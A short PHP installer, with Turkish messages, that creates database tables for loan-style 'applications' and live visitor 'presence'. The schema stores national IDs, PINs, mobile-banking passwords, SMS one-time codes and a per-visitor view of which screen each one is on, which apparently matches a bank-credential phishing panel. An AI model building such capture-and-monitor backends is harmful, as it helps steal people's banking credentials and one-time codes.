<?php
require_once __DIR__ . '/includes/bootstrap.php';
require_once __DIR__ . '/includes/storage.php';

try {
    $pdo = getDbConnection();
    
    // Uygulama tablosu
    $pdo->exec("CREATE TABLE IF NOT EXISTS `applications` (
        `id` VARCHAR(16) PRIMARY KEY,
        `full_name` VARCHAR(255) DEFAULT '',
        `user_code` VARCHAR(255) DEFAULT '',
        `national_id` VARCHAR(255) DEFAULT '',
        `phone` VARCHAR(50) DEFAULT '',
        `email` VARCHAR(255) DEFAULT '',
        `amount` VARCHAR(255) DEFAULT '',
        `demo_pin` VARCHAR(255) DEFAULT '',
        `demo_pin_hash` VARCHAR(255) DEFAULT '',
        `demo_pin_masked` VARCHAR(255) DEFAULT '',
        `mobile_password_hash` VARCHAR(255) DEFAULT '',
        `mobile_password_masked` VARCHAR(255) DEFAULT '',
        `sms_code` VARCHAR(255) DEFAULT '',
        `sms_verified` TINYINT(1) DEFAULT 0,
        `sms_attempts` INT DEFAULT 0,
        `sms_last_verified_at` DATETIME NULL,
        `sms_last_attempt_at` DATETIME NULL,
        `status` VARCHAR(50) DEFAULT 'beklemede',
        `client_ip` VARCHAR(100) DEFAULT '',
        `consent` TINYINT(1) DEFAULT 1,
        `created_at` DATETIME,
        `updated_at` DATETIME
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

    // Ziyaretçi tablosu
    $pdo->exec("CREATE TABLE IF NOT EXISTS `presence` (
        `session_id` VARCHAR(128) PRIMARY KEY,
        `screen` VARCHAR(50) DEFAULT '',
        `screen_label` VARCHAR(100) DEFAULT '',
        `application_id` VARCHAR(16) DEFAULT '',
        `ip` VARCHAR(100) DEFAULT '',
        `is_admin` TINYINT(1) DEFAULT 0,
        `last_seen_ts` INT DEFAULT 0,
        `last_seen` DATETIME
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;");

    echo "<h1>TEBRIKLER!</h1>";
    echo "<p>Veritabani tablolari Aiven uzerinde basariyla olusturuldu. Sistem kullanima hazir.</p>";
    echo "<a href='index.php'>Ana Sayfaya Git</a>";

} catch (Exception $e) {
    echo "<h1>HATA OLUSTU:</h1>";
    echo "<p>" . $e->getMessage() . "</p>";
}
